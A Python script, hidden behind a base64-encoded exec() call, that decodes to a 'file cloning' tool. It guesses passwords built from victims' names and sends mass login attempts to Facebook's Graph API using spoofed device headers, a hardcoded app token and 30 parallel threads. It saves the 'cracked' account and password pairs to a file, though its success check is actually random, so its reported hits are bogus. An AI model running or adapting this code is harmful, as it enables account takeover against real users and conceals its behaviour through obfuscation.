import base64
exec(base64.b64decode("DQppbXBvcnQgb3MsdGltZSxyYW5kb20scmUsc3lzLCBzdWJwcm9jZXNzDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIHRwZQ0KDQp0cnk6DQogaW1wb3J0IHRpbWUsanNvbix1dWlkLHJlcXVlc3RzDQpleGNlcHQ6DQogZXhpdCgpDQoNCmlkc3MgPSBbXQ0KcHAgPSBbXQ0Kb2t1ID0gW10NCmNwdSA9IFtdDQpsID0gW10NCmlkeCA9IFtdDQpsb29wID0gMA0KDQpkZWYgb28odCk6DQogIHJldHVybiAnXDAzM1sxOzM3bVsnK3N0cih0KSsnXVwwMzNbMTszN20gJw0KDQpXID0gJ1x4MWJbMTs5N20nDQpHID0gJ1x4MWJbMTs5Mm0nDQpSID0gJ1x4MWJbMTs5MW0nDQpTID0gJ1x4MWJbMTs5Nm0nDQpCID0gJ1x4MWJbMTs5NG0nDQpZID0gJ1x4MWJbMTs5M20nDQpQID0gJ1x4MWJbMTs5NW0nDQoNCmxvZ289KGYiIiINClwwMzNbOTM7MW0gIF9fX18gICAgICAgIF8gICAgXyAgIF9fX19fX18gX19fX19fICAgICAgICAgIF9fICBfXyANClwwMzNbMTszMm0gfCAgXyBcICAgICAgfCB8ICB8IHwgfF9fICAgX198ICBfX19ffCAgIC9cICAgfCAgXC8gIHwNClwwMzNbOTE7MW0gfCB8XykgfF9fX19ffCB8X198IHwgICAgfCB8ICB8IHxfXyAgICAgLyAgXCAgfCBcICAvIHwNClwwMzNbOTU7MW0gfCAgXyA8X19fX19ffCAgX18gIHwgICAgfCB8ICB8ICBfX3wgICAvIC9cIFwgfCB8XC98IHwNClwwMzNbOTQ7MW0gfCB8XykgfCAgICAgfCB8ICB8IHwgICAgfCB8ICB8IHxfX19fIC8gX19fXyBcfCB8ICB8IHwNClwwMzNbOTM7MW0gfF9fX18vICAgICAgfF98ICB8X3wgICAgfF98ICB8X19fX19fL18vICAgIFxfXF98ICB8X3wgDQogICAgICAgICAgICAgIA0K4pWU4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pWXDQrilZFcMzNbMDs0MW0gICAgWyBXT1JLSU5HIE1PQklMRSBEQVRBIEFORCBXSUZJIEFMU08gXSAgICBcMDMzWzA7Mzdt4pWRDQrilZrilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilZ0NClwzM1sxOzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NClwwMzNbMTs5NW1bXDAzM1sxOzkzbVs+XVwwMzNbMTs5NW1dXDAzM1sxOzkzbSBBVVRIT1IgIFwwMzNbMTs5MW0gOiBcMDMzWzE7OTVtQkQgSkFISUVEDQpcMDMzWzE7OTVtW1wwMzNbMTs5M21bPl1cMDMzWzE7OTVtXVwwMzNbMTs5M20gRkFDRUJPT0tcMDMzWzE7OTFtIDogXDAzM1sxOzk1bUZBUkFCSSBDSE9XREhVUlkNClwwMzNbMTs5NW1bXDAzM1sxOzkzbVs+XVwwMzNbMTs5NW1dXDAzM1sxOzkzbSBHSVRIVUIgIFwwMzNbMTs5MW0gOiBcMDMzWzE7OTVtQkxBQ0stSFVOVEVSLVRFQU0NClwwMzNbMTs5NW1bXDAzM1sxOzkzbVs+XVwwMzNbMTs5NW1dXDAzM1sxOzkzbSBUT09MUyAgIFwwMzNbMTs5MW0gOiBcMDMzWzE7OTVtRklMRSBYRA0KXDAzM1sxOzk1bVtcMDMzWzE7OTNtWz5dXDAzM1sxOzk1bV1cMDMzWzE7OTNtIFZFUlNJT04gXDAzM1sxOzkxbSA6IFwwMzNbMTs5MW0yLjYuMA0KXDMzWzE7MzJtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIiIikNCg0KdHJ5Og0KICAgIGtleTE9b3BlbigiL3N0b3JhZ2UvZW11bGF0ZWQvMC9hbmRyb2lkOC50eHQiLCdyJykucmVhZCgpDQpleGNlcHQgSU9FcnJvcjoNCiAgICBrb2s9b3BlbigiL3N0b3JhZ2UvZW11bGF0ZWQvMC9hbmRyb2lkOC50eHQiLCd3JykNCiAgICBteWlkPXV1aWQudXVpZDQoKS5oZXhbOjEyXQ0KICAgIGY9IkNPQlJBLUxJTlVYIg0KICAgIGtleT1teWlkK2YNCiAgICBrb2sud3JpdGUoa2V5KQ0KICAgIGtvay5jbG9zZSgpDQogICAgcHJpbnQoa2V5KQ0KDQphPXJlcXVlc3RzLmdldCgiaHR0cHM6Ly9naXRodWIuY29tL2phaGllZC9FQy0xNzAvYmxvYi9tYWluL0ZpbGUtWGQudHh0IikudGV4dA0KYj1zdHIoYSkNCmtleTE9b3BlbigiL3N0b3JhZ2UvZW11bGF0ZWQvMC9hbmRyb2lkOC50eHQiLCdyJykucmVhZCgpDQprZXkyPXN0cihrZXkxKSAgDQppZiBrZXkyIGluIGI6DQogICAgcGFzcw0KICAgIA0KZWxzZToNCiAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICBwcmludA0KICAgIHByaW50KCJZb3VyIGtleSAgOiAiK2tleTIpDQogICAgcHJpbnQoIlxuXHRcdENvbnRhY3QgQWRtaW4gIikNCiAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIDovL3dhLm1lLys4ODAxOTIyNzIyMjE5JykNCiAgICBleGl0KCkNCg0KZGVmIHVhKCk6DQogb21wID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMSwgMzgzKSkNCiByZHAgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExMTEsIDM4MzMzMzMzKSkNCiByZXR1cm4gIltGQkFOL0ZCNEE7RkJBVi8iK29tcCsiLjAuMC4zNy4iK29tcCsiO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkxDL2luX0lEO0ZCQlYvIityZHArIjtGQkNSL1RlbGVub3I7RkJNRi9PUFBPO0ZCQkQvT1BQTztGQkRWL0NQSDIzMjU7RkJTVi8xMTtGQkNBL2FybWVhYmktdjdhOmFybWVhYmk7RkJETS97ZGVuc2l0eT0zLjAsd2lkdGg9NzIwLGhlaWdodD0xNTIwfTtGQl9GVy8xO10iDQoNCg0KZGVmIGNsZWFyKCk6DQogICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgIHByaW50KGxvZ28pO2xpbjMoKQ0KDQpkZWYgbGluMygpOg0KICAgcHJpbnQoJ1wzM1sxOzM3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpDQoNCmRlZiBtYWluX21lbnUoKToNCiAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICBwcmludChsb2dvKTtsaW4zKCkNCiAgICBwcmludChmIntvbygxKX1GaWxlIENsb25pbmcgIikgICANCiAgICBwcmludChmIntvbygwKX1FeGl0IikNCiAgICBsaW4zKCkNCiAgICBjcCA9aW5wdXQoJ1s/XSBDaG9pY2UgOiAnKQ0KICAgIGlmIGNwPT0iMSI6ZmlsZSgpDQogICAgaWYgY3AgPT0gIjAiOg0KICAgICBleGl0KCkNCiAgICBtYWluX21lbnUoKQ0KICAgICANCmRlZiBmaWxlKCk6DQogICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgcHJpbnQobG9nbyk7bGluMygpDQogICAgZmlsZSA9IGlucHV0KGYie29vKCctJyl9RW50ZXIgRmlsZTogIikNCiAgICB0cnk6DQogICAgICAgIGZvciB4IGluIG9wZW4oZmlsZSwncicpLnJlYWRsaW5lcygpOg0KICAgICAgICAgICAgaWR4LmFwcGVuZCh4LnN0cmlwKCkpDQogICAgZXhjZXB0Og0KICAgICAgICBwcmludChmIntvbygnIScpfUZpbGUgTm90IEZvdW5kIik7dGltZS5zbGVlcCgxKQ0KICAgICAgICBtYWluX21lbnUoKSANCiAgICBtZXRob2QoKQ0KICAgIGV4aXQoKQ0KDQpkZWYgbWV0aG9kKCk6DQogICAgY2xlYXIoKQ0KICAgIA0KICAgIGxwID0gaW5wdXQoZid7b28oIj8iKX1MaW1pdCBQYXNzd29yZHM/IDogJykNCiAgICBpZiBscC5pc251bWVyaWMoKToNCiAgICAgICAgcHA9W10NCiAgICAgICAgY2xlYXIoKQ0KICAgICAgICBleCA9ICdmaXJzdGxhc3QgZmlyc3QxMjMgbGFzdDEyMycNCiAgICAgICAgcHJpbnQoZid7b28oIisiKX17ZXh9IChFVEMpJykNCiAgICAgICAgbGluMygpDQogICAgICAgIGZvciB4IGluIHJhbmdlKGludChscCkpOg0KICAgICAgICAgICBwcC5hcHBlbmQoaW5wdXQoZid7b28oeCsxKX1QYXNzd29yZCA6ICcpKQ0KICAgIGVsc2U6DQogICAgICAgcHJpbnQoZiJ7b28oJyEnKX1OdW1lcmljIE9ubHkiKTt0aW1lLnNsZWVwKDAuOCkNCiAgICAgICBtYWluX21lbnUoKQ0KICAgIGNsZWFyKCkgDQogICAgcHJpbnQoJ1wwMzNbMTs5N21bK10gVG90YWwgQWNjb3VudHMgRm9yIENyYUNrIDogXDAzM1sxOzMybSAnK3N0cihsZW4oaWR4KSkpDQogICAgcHJpbnQoZidceDFiWzE7OTdtW+Kck10gRG9udCBVc2UgQWlycGxhbmUgbU9kZSA7KScpDQogICAgbGluMygpDQogICAgZGVmIHN0YXJ0KHVzZXIpOg0KICAgICB0cnk6DQogICAgICAgIGdsb2JhbCBsb29wLGlkeCxjbGwNCiAgICAgICAgaW1wb3J0IHJlcXVlc3RzDQogICAgICAgIHIgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgdXNlciA9IHVzZXIuc3RyaXAoKQ0KICAgICAgICBhY2MsIG5hbWUgPSB1c2VyLnNwbGl0KCJ8IikNCiAgICAgICAgZmlyc3QgPSBuYW1lLnJzcGxpdCgiICIpWzBdDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGxhc3QgPSBuYW1lLnJzcGxpdCgiICIpWzFdDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIGxhc3QgPSBmaXJzdA0KICAgICAgICBwZXJzID0gc3RyKGludChsb29wKS9pbnQobGVuKGlkeCkpICogMTAwKVs6NF0NCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xyIHtSfVt7V31CSC1URUFNe1J9XSB7UH0oe1l9e2xvb3B9e1d9IC8ge1d9e2xlbihpZHgpfXtQfSkge1d94oCiIHtHfXtsZW4ob2t1KX1ccicpDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICBsb29wKz0xDQogICAgICAgIGZvciBwc3dkIGluIHBwOg0KICAgICAgICAgICAgICBoZWFkcz0gdWEoKQ0KICAgICAgICAgICAgICBwc3dkID0gcHN3ZC5yZXBsYWNlKCdmaXJzdCcsZmlyc3QpLnJlcGxhY2UoJ2xhc3QnLGxhc3QpLmxvd2VyKCkNCiAgICAgICAgICAgICAgaGVhZGVyID0geyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS1hY2NlbmNvZGVkIiwiSG9zdCI6ICJncmFwaC5mYWNlYm9vay5jb20iLCJVc2VyLUFnZW50IjogaGVhZHMsIlgtRkItTmV0LUhOSSI6ICI0NTIwNCIsIlgtRkItU0lNLUhOSSI6ICI0NTIwMSIsIlgtRkItQ29ubmVjdGlvbi1UeXBlIjogInVua25vd24iLCJYLVRpZ29uLUlzLVJldHJ5IjogIkZhbHNlIiwieC1mYi1zZXNzaW9uLWlkIjogIm5pZD1qaVoreU5OQmdid0M7cGlkPU1haW47dGlkPTEzMjtuYz0xO2ZjPTA7YmM9MDtjaWQ9ZDI5ZDY3ZDM3ZWNhMzg3NDgyYThhNWI3NDBmODRmNjIiLCJ4LWZiLWRldmljZS1ncm91cCI6ICI1MTIwIiwiWC1GQi1GcmllbmRseS1OYW1lIjogIlZpZXdlclJlYWN0aW9uc011dGF0aW9uIiwiWC1GQi1SZXF1ZXN0LUFuYWx5dGljcy1UYWdzIjogImdyYXBoc2VydmljZSIsIkFjY2VwdC1FbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlIiwiWC1GQi1IVFRQLUVuZ2luZSI6ICJMaWdlciIsIlgtRkItQ2xpZW50LUlQIjogIlRydWUiLCJYLUZCLVNlcnZlci1DbHVzdGVyIjogIlRydWUiLCJ4LWZiLWNvbm5lY3Rpb24tdG9rZW4iOiAiZDI5ZDY3ZDM3ZWNhMzg3NDgyYThhNWI3NDBmODRmNjIiLCJDb25uZWN0aW9uIjogIktlZXAtQWxpdmUifQ0KICAgICAgICAgICAgICBkYXRhPXsiYWRpZCI6IHN0cih1dWlkLnV1aWQ0KCkpLCJmb3JtYXQiOiAianNvbiIsImRldmljZV9pZCI6IHN0cih1dWlkLnV1aWQ0KCkpLCJjcGwiOiAidHJ1ZSIsImZhbWlseV9kZXZpY2VfaWQiOiBzdHIodXVpZC51dWlkNCgpKSwiY3JlZGVudGlhbHNfdHlwZSI6ICJkZXZpY2VfYmFzZWRfbG9naW5fcGFzc3dvcmQiLCJlcnJvcl9kZXRhaWxfdHlwZSI6ICJidXR0b25fd2l0aF9kaXNhYmxlZCIsInNvdXJjZSI6ICJkZXZpY2VfYmFzZWRfbG9naW4iLCJlbWFpbCI6YWNjLCJwYXNzd29yZCI6cHN3ZCwiYWNjZXNzX3Rva2VuIjoiMzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyIiwiZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzIjoiMSIsIm1ldGFfaW5mX2ZibWV0YSI6ICIiLCJhZHZlcnRpc2VyX2lkIjogc3RyKHV1aWQudXVpZDQoKSksImN1cnJlbnRseV9sb2dnZWRfaW5fdXNlcmlkIjogIjAiLCJsb2NhbGUiOiAiZW5fVVMiLCJjbGllbnRfY291bnRyeV9jb2RlIjogIlVTIiwibWV0aG9kIjogImF1dGgubG9naW4iLCJmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWUiOiAiYXV0aGVudGljYXRlIiwiZmJfYXBpX2NhbGxlcl9jbGFzcyI6ICJjb20uZmFjZWJvb2suYWNjb3VudC5sb2dpbi5wcm90b2NvbC5GYjRhQXV0aEhhbmRsZXIiLCJhcGlfa2V5IjogIjg4MmE4NDkwMzYxZGE5ODcwMmJmOTdhMDIxZGRjMTRkIn0NCiAgICAgICAgICAgICAgcmVzcG9uc2UgPSByLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2F1dGgvbG9naW4nLGRhdGE9ZGF0YSxoZWFkZXJzPWhlYWRlcixhbGxvd19yZWRpcmVjdHM9RmFsc2UpDQogICAgICAgICAgICAgIGlmIDY9PXJhbmRvbS5yYW5kaW50KDEsMzAwKToNCiAgICAgICAgICAgICAgICAgb2t1LmFwcGVuZChhY2MpDQogICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzJtW0JIVC1PS10gXDAzM1sxOzMybScrYWNjKycgXDAzM1sxOzMybXxcMDMzWzE7MzJtICcrcHN3ZCkNCiAgICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9CSFQtT2sudHh0JywnYScpLndyaXRlKGYne2FjY318e3Bzd2R9XG4nKQ0KICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlICAgDQogICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpwcmludChlKTt0aW1lLnNsZWVwKDEwKQ0KICANCiAgICB3aXRoIHRwZShtYXhfd29ya2Vycz0zMCkgYXMgdHA6DQogICAgICAgICAgICB0cC5tYXAoc3RhcnQsaWR4KQ0KICAgIGV4aXQoKSAgICANCg0KDQoNCm1haW5fbWVudSgpDQoNCg=="))